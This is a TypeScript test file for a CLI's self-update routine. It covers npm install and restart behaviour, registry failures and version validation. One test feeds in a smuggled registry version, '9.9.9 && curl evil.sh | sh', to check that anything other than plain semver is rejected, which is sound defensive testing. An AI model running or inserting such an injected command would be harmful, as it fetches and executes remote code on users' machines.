import { afterEach, describe, expect, it, vi } from 'vitest'

// The updater only runs on release builds, and hands over by spawning npm and
// then itself — both have to be faked to exercise the upgrade path at all.
vi.mock(import('./release.js'), () => ({ RELEASE_VERSION: '1.0.1' }))

/** How the mocked child process ends: an exit code, or a failure to start. */
let childResult: { code: number } | { error: true } = { code: 0 }

const spawn = vi.fn(() => ({
	on(event: string, cb: (code: number) => void) {
		if ('error' in childResult ? event === 'error' : event === 'close') {
			queueMicrotask(() => cb('code' in childResult ? childResult.code : 0))
		}
	},
	unref: vi.fn(),
}))
vi.mock(import('node:child_process'), () => ({ spawn }))

const { checkForUpdate } = await import('./update.js')

const SELF = '/opt/node/lib/node_modules/@usagefleet/cli/dist/index.js'
const realArgv1 = process.argv[1]
process.argv[1] = SELF

afterEach(() => {
	process.argv[1] = realArgv1 as string
	childResult = { code: 0 }
	vi.unstubAllGlobals()
	spawn.mockClear()
})

/** The registry answering `GET /@usagefleet/cli/latest`. */
function stubRegistry(version: unknown) {
	vi.stubGlobal('fetch', async () => Response.json({ version }))
}

describe('checkForUpdate', () => {
	it('installs the published version and restarts the service', async () => {
		stubRegistry('9.9.9')

		await expect(checkForUpdate(() => {})).resolves.toBe('9.9.9')
		expect(spawn).toHaveBeenNthCalledWith(
			1,
			expect.stringContaining('npm'),
			['install', '--global', '@usagefleet/cli@9.9.9'],
			expect.anything(),
		)
		expect(spawn).toHaveBeenLastCalledWith(
			process.execPath,
			[SELF, 'install'],
			expect.objectContaining({ detached: true }),
		)
	})

	it('stays put on the version it already runs', async () => {
		stubRegistry('1.0.1')

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).not.toHaveBeenCalled()
	})

	// `watch` runs this inside its cycle: a thrown error would skip the limits
	// report on every tick while the registry is unreachable.
	it('resolves null instead of throwing when the registry is unreachable', async () => {
		vi.stubGlobal('fetch', async () => {
			throw new TypeError('fetch failed')
		})

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).not.toHaveBeenCalled()
	})

	// A version string from the registry becomes an `npm install` argument, and
	// on Windows that argv goes through a shell.
	it('ignores a version that is not plain semver', async () => {
		stubRegistry('9.9.9 && curl evil.sh | sh')

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).not.toHaveBeenCalled()
	})

	// A failed install (no write access to the global prefix, network drop) must
	// not restart the service onto a version that was never installed.
	it('does not restart when npm fails', async () => {
		stubRegistry('9.9.9')
		childResult = { code: 1 }

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).toHaveBeenCalledOnce()
	})

	it('survives npm missing entirely', async () => {
		stubRegistry('9.9.9')
		childResult = { error: true }

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).toHaveBeenCalledOnce()
	})
})
